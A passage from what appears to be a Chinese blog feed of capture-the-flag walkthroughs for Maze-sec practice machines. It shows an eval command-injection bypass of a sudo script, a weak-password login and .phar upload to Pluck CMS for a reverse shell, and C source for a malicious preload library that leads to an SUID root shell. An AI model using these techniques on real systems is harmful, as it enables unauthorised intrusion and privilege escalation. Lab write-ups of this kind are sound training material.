class="hljs-variable">$user_input</span>&quot;</span> | grep -qE <span class="hljs-string">&#x27;[[:space:]]&#x27;</span>; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> ! <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | grep -qE <span class="hljs-string">&#x27;^[a-zA-Z0-9]*[[:space:]]+[a-zA-Z0-9]*$&#x27;</span>; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;错误：空格使用受限&quot;</span><br>            <span class="hljs-built_in">return</span> 1<br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>会检查参数是否存在空格，如果存在空格，需要符合 grep 的正则表达式<code>^[a-zA-Z0-9]* [[:space:]]+[a-zA-Z0-9]*$</code>，符合的格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span><br> <span class="hljs-built_in">id</span><br>id123 i123d<br></code></pre></td></tr></table></figure><p>grep 按行匹配，可以利用 grep 视野盲区，只要某一行没有空格，就不会进入第三层检 查，检查是否符合以上三种格式，可以使用 bash -x 执行脚本，方便调试</p><p><strong>4、eval 注入点</strong><br>脚本里存在一个 eval 执行代码，会先尝试替换掉换行符和回车符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">local</span> sanitized_input=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n\r&#x27;</span>)<br><span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;output=\&quot;<span class="hljs-variable">$sanitized_input</span>\&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>5、本地调试</strong><br>尝试使用 bash -x 执行脚本，方便调试，因为 <code>eval &quot;output=\&quot;$sanitized_input\&quot;&quot;</code> 这里使用双 引号包裹变量，可以尝试给一个双引号，看看会发生什么<br>脚本因为我们传入的双引号，导致闭合出现问题，那么说明我们可以通过闭合双引号，真实的改变 eval 执行语句的结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">rin@meltdown:/opt$ bash -x repeater.sh <span class="hljs-string">&#x27;&quot;&#x27;</span><br>+ <span class="hljs-string">&#x27;[&#x27;</span> 1 -ne 1 <span class="hljs-string">&#x27;]&#x27;</span><br>+ main <span class="hljs-string">&#x27;&quot;&#x27;</span><br>+ <span class="hljs-built_in">local</span> <span class="hljs-string">&#x27;user_input=&quot;&#x27;</span><br>+ grep -qE <span class="hljs-string">&#x27;[;&amp;|`$\\]&#x27;</span><br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&quot;&#x27;</span><br>+ grep -qiE <span class="hljs-string">&#x27;(cat|ls|echo|rm|mv|cp|chmod)&#x27;</span><br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&quot;&#x27;</span><br>+ grep -qE <span class="hljs-string">&#x27;[[:space:]]&#x27;</span><br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&quot;&#x27;</span><br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;处理结果: &quot;&#x27;</span><br>处理结果: <span class="hljs-string">&quot;</span><br><span class="hljs-string">++ tr -d &#x27;\n\r&#x27;</span><br><span class="hljs-string">++ echo &#x27;&quot;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">+ local &#x27;</span>sanitized_input=<span class="hljs-string">&quot;&#x27;</span><br><span class="hljs-string">+ eval &#x27;output=&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">repeater.sh: eval: line 29: unexpected EOF while looking for matching `&quot;&#x27;</span><br>repeater.sh: <span class="hljs-built_in">eval</span>: line 30: syntax error: unexpected end of file<br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;最终输出: &#x27;</span><br>最终输出: <br></code></pre></td></tr></table></figure><p>在 <code>3、空格限制</code> 和 <code>4、替换掉换行符和回车符</code> ，两个限制条件放在一起，可以想到，通过 <code>3、空格限制</code> ， 使用 id 的格式，构造出空格，使用 <code>4、替换掉换行符和回车符</code> ，在把换行和回车符替换掉后，会出现拼接的效果，通过这个特性，可以构造出任意命令执行 </p><p>参数里怎么输入换行？你只需要不闭合引号，直接输入换行即可，最后闭合引号即可，中间内容都会原样传给脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">rin@meltdown:/opt$ bash -x repeater.sh <span class="hljs-string">&#x27;&quot;        </span><br><span class="hljs-string">&gt;  id</span><br><span class="hljs-string">&gt; &quot;&#x27;</span><br>+ <span class="hljs-string">&#x27;[&#x27;</span> 1 -ne 1 <span class="hljs-string">&#x27;]&#x27;</span><br>+ main <span class="hljs-string">&#x27;&quot;</span><br><span class="hljs-string"> id</span><br><span class="hljs-string">&quot;&#x27;</span><br>+ <span class="hljs-built_in">local</span> <span class="hljs-string">&#x27;user_input=&quot;</span><br><span class="hljs-string"> id</span><br><span class="hljs-string">&quot;&#x27;</span><br>+ grep -qE <span class="hljs-string">&#x27;[;&amp;|`$\\]&#x27;</span><br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&quot;</span><br><span class="hljs-string"> id</span><br><span class="hljs-string">&quot;&#x27;</span><br>+ grep -qiE <span class="hljs-string">&#x27;(cat|ls|echo|rm|mv|cp|chmod)&#x27;</span><br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&quot;</span><br><span class="hljs-string"> id</span><br><span class="hljs-string">&quot;&#x27;</span><br>+ grep -qE <span class="hljs-string">&#x27;[[:space:]]&#x27;</span><br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&quot;</span><br><span class="hljs-string"> id</span><br><span class="hljs-string">&quot;&#x27;</span><br>+ grep -qE <span class="hljs-string">&#x27;^[a-zA-Z0-9]*[[:space:]]+[a-zA-Z0-9]*$&#x27;</span><br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&quot;</span><br><span class="hljs-string"> id</span><br><span class="hljs-string">&quot;&#x27;</span><br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;处理结果: &quot;</span><br><span class="hljs-string"> id</span><br><span class="hljs-string">&quot;&#x27;</span><br>处理结果: <span class="hljs-string">&quot;</span><br><span class="hljs-string"> id</span><br><span class="hljs-string">&quot;</span><br>++ <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n\r&#x27;</span><br>++ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&quot;</span><br><span class="hljs-string"> id</span><br><span class="hljs-string">&quot;&#x27;</span><br>+ <span class="hljs-built_in">local</span> <span class="hljs-string">&#x27;sanitized_input=&quot; id&quot;&#x27;</span><br>+ <span class="hljs-built_in">eval</span> <span class="hljs-string">&#x27;output=&quot;&quot; id&quot;&quot;&#x27;</span><br>++ output=<br>++ <span class="hljs-built_in">id</span><br>uid=1000(rin) gid=1000(rin) <span class="hljs-built_in">groups</span>=1000(rin)<br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;最终输出: &#x27;</span><br>最终输出: <br></code></pre></td></tr></table></figure><p>换成<code>sudo</code>即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">rin@meltdown:/opt$ <span class="hljs-built_in">sudo</span> /opt/repeater.sh <span class="hljs-string">&#x27;&quot;</span><br><span class="hljs-string">&gt;  id</span><br><span class="hljs-string">&gt; &quot;&#x27;</span><br>处理结果: <span class="hljs-string">&quot;</span><br><span class="hljs-string"> id</span><br><span class="hljs-string">&quot;</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>最终输出: <br></code></pre></td></tr></table></figure><p>获取到root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">rin@meltdown:/opt$ <span class="hljs-built_in">sudo</span> /opt/repeater.sh <span class="hljs-string">&#x27;&quot;         </span><br><span class="hljs-string">&gt;  su</span><br><span class="hljs-string">&gt; &quot;&#x27;</span><br>处理结果: <span class="hljs-string">&quot;</span><br><span class="hljs-string"> su</span><br><span class="hljs-string">&quot;</span><br>root@meltdown:/opt# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="四、查看flag"><a href="#四、查看flag" class="headerlink" title="四、查看flag"></a>四、查看flag</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@meltdown:~# <span class="hljs-built_in">cat</span> /root/root.txt /home/rin/user.txt <br>flag&#123;root-3508528e639741db9ee8ba82ff66318b&#125;<br>flag&#123;user-86e507f360df4e80b63234f051c99a6e&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Yuan</title>
    <link href="/Maze-sec/Yuan/"/>
    <url>/Maze-sec/Yuan/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-04 14:30 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00036s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00039s latency).<br>MAC Address: 08:00:27:6D:22:97 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.30<br>Host is up (0.00060s latency).<br>MAC Address: 08:00:27:95:B9:E8 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.14 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.30</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.30                        <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-04 14:30 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.30<br>Host is up (0.0011s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:95:B9:E8 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.04 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.30 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-04 14:31 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.30<br>Host is up (0.00076s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Maze-Sec \xE5\x85\x83\xE6\x97\xA6\xE5\xBA\x86\xE7\xA5\x9D<br>|_http-server-header: Apache/2.4.62 (Debian)<br>MAC Address: 08:00:27:95:B9:E8 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.12 seconds<br></code></pre></td></tr></table></figure><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.30                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-04 14:32 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.30<br>Host is up (0.00098s latency).<br>All 100 scanned ports on 192.168.2.30 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 53 closed udp ports (port-unreach), 47 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:95:B9:E8 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 50.70 seconds<br></code></pre></td></tr></table></figure><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.30 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md,db,js<br>...<br>/index.html           (Status: 200) [Size: 16876]<br>/pluck                (Status: 301) [Size: 312] [--&gt; http://192.168.2.30/pluck/]<br>...<br></code></pre></td></tr></table></figure><p>找到目录<code>/pluck</code>，访问发现是<code>pluck cms</code>，版本为<code>4.7.7</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601041446385.png"></p><h2 id="2、Pluck-cms"><a href="#2、Pluck-cms" class="headerlink" title="2、Pluck cms"></a>2、Pluck cms</h2><h3 id="1-弱口令登录"><a href="#1-弱口令登录" class="headerlink" title="1-弱口令登录"></a>1-弱口令登录</h3><p>经过尝试，发现存在弱口令<code>pluck</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601041459011.png"></p><h3 id="2-文件上传"><a href="#2-文件上传" class="headerlink" title="2-文件上传"></a>2-文件上传</h3><p>找到文件上传，尝试上传<code>php</code>格式文件，发现变成了<code>php.txt</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601041540948.png"></p><p>使用<code>phar</code>进行替代，成功上传，反弹到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444       <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.30] 32776<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p>稳定shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure><h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><h2 id="1、获取Tommy4权限"><a href="#1、获取Tommy4权限" class="headerlink" title="1、获取Tommy4权限"></a>1、获取Tommy4权限</h2><p>查看<code>/etc/passwd</code>，找到用户<code>tommy4</code>的密码<code>v3fXTfJ06cMMfAKGQwkZ</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Yuan:/home$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>tommy4:x:1000:1000:,v3fXTfJ06cMMfAKGQwkZ,:/home/tommy4:/bin/bash<br>xnzcode:x:1001:1001:,,,:/home/xnzcode:/bin/bash<br></code></pre></td></tr></table></figure><p>成功获取到tommy4用户权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Yuan:/home$ su tommy4<br>Password: <br>tommy4@Yuan:/home$ <span class="hljs-built_in">id</span><br>uid=1000(tommy4) gid=1000(tommy4) <span class="hljs-built_in">groups</span>=1000(tommy4)<br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>查看全局可写的文件，排除<code>/proc、/sys</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">tommy4@Yuan:~$ find / \( -path /proc -o -path /sys \) -prune -o -perm -o=w -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>/etc/ld.so.preload<br>/var/www/html/pluck/data/settings/install.dat<br>/var/www/html/pluck/data/settings/pages/1.1.php<br>/var/www/html/pluck/data/settings/pages/2.maze-sec.php<br>/var/www/html/pluck/data/settings/themepref.php<br>/var/www/html/pluck/data/settings/pass.php<br>/var/www/html/pluck/data/settings/options.php<br>/var/www/html/pluck/data/settings/token.php<br>/var/www/html/pluck/data/settings/update_lastcheck.php<br>/var/www/html/pluck/images/rev.jpg<br></code></pre></td></tr></table></figure><p>发现<code>/etc/ld.so.preload</code>可写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tommy4@Yuan:~$ <span class="hljs-built_in">ls</span> -la /etc/ld.so.preload <br>-rw-r--rw- 1 root root 0 Dec 20 06:27 /etc/ld.so.preload<br></code></pre></td></tr></table></figure><p>这是一个经典的提权向量。<code>/etc/ld.so.preload</code>文件用于指定在程序启动时预加载的共享库，如果我们能控制这个文件，就可以让任何以root权限运行的非SUID程序加载我们的恶意共享库。</p><p>恶意共享库</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> _init() &#123;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br><span class="hljs-keyword">if</span> (getuid() == <span class="hljs-number">0</span>) &#123;<br>setgid(<span class="hljs-number">0</span>);<br>setuid(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// 复制 bash 并设置 SUID 权限</span><br>system(<span class="hljs-string">&quot;cp /bin/bash /tmp/rootbash &amp;&amp; chmod u+s /tmp/rootbash&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译和使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#编译文件</span><br>gcc -fPIC -shared -nostartfiles -o shell.so shell.c<br><span class="hljs-built_in">chmod</span> 755 shell.so<br><br><span class="hljs-comment">#写入ld.so.preload</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/tmp/shell.so&quot;</span> &gt; /etc/ld.so.preload<br><br><span class="hljs-comment"># 触发（访问网页或等待任意 root 进程执行）在攻击机上执行 </span><br>curl http://192.168.2.30<br><br><span class="hljs-comment"># 清除 ld.so.preload </span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; /etc/ld.so.preload <br><br><span class="hljs-comment"># 获取 root shell </span><br>/tmp/rootbash -p <br></code></pre></td></tr></table></figure><p>获取到root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">tommy4@Yuan:/tmp$ /tmp/rootbash -p<br>rootbash-5.0# <span class="hljs-built_in">id</span><br>uid=1000(tommy4) gid=1000(tommy4) euid=0(root) <span 